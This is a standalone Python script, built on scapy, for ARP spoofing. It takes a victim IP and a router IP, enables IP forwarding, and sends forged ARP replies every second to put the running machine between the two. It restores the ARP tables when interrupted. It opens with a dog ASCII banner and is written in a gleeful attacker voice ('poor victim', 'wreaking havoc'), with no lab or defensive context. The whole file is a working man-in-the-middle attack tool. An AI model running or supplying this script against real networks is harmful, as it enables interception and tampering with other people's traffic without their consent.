#!/usr/bin/env python3
doggy = """
    __    __
    \/----\/
     \0  0/    WOOF!
     _\  /_
   _|  \/  |_
  | | |  | | |
 _| | |  | | |_
"---|_|--|_|---"
"""
import os
import sys
import time
import argparse
import logging
import socket
import scapy.all as scapy
def setup_logging(verbose=False):
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')
def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False
def get_local_ip():
    try:
        return scapy.get_if_addr()
    except OSError:
        logging.error("Failed to snatch the local IP address")
        sys.exit(1)
def get_active_hosts(interface):
    logging.info("Scanning the network for active targets...")
    try:
        ans, _ = scapy.arping(interface, timeout=1, verbose=False)
        active_hosts = [response[1].psrc for response in ans]
        logging.info("Snatched some active targets: %s", active_hosts)
        return active_hosts
    except Exception as e:
        logging.error("Failed to locate active targets: %s", e)
        return []
def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, retry=3)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except IndexError:
        pass
def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
        logging.info("Sent a devious ARP packet to %s", target_ip)
    else:
        logging.error("Failed to get the MAC address of the target %s", target_ip)
def restore_arp_tables(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
        logging.info("ARP tables reset for %s", destination_ip)
    else:
        logging.error("Failed to reset ARP tables for %s", destination_ip)
def enable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
            if file.read() == "0\n":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
                    file.write("1\n")
                    logging.info("IP forwarding is now on")
    except IOError:
        logging.exception("Failed to flick the IP forwarding switch")
def disable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
            if file.read() == "1\n":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
                    file.write("0\n")
                    logging.info("IP forwarding is now off")
    except IOError:
        logging.exception("Failed to turn off IP forwarding")
def main(args):
    victim_ip = args.victim_ip
    router_ip = args.router_ip
    interface = args.interface
    verbose = args.verbose
    setup_logging(verbose)
    if not validate_ip(victim_ip) or not validate_ip(router_ip):
        logging.error("The provided IP addresses are gibberish")
        sys.exit(1)
    if not interface:
        interface = get_local_ip()
    try:
        enable_ip_forwarding()
        logging.info("Preparing to rain ARP storms...")
        while True:
            arp_spoof(victim_ip, router_ip)
            arp_spoof(router_ip, victim_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("Detected Ctrl+C, resetting the battlefield...")
        restore_arp_tables(victim_ip, router_ip)
        restore_arp_tables(router_ip, victim_ip)
        disable_ip_forwarding()
        sys.exit(0)
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script for wreaking havoc with ARP spoofing")
    parser.add_argument("victim_ip", help="IP address of the poor victim")
    parser.add_argument("router_ip", help="IP address of the unfortunate router")
    parser.add_argument("-i", "--interface", help="Interface for reconnaissance (default: system's local IP)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for more chaos")
    args = parser.parse_args()
    print(doggy)
    main(args)
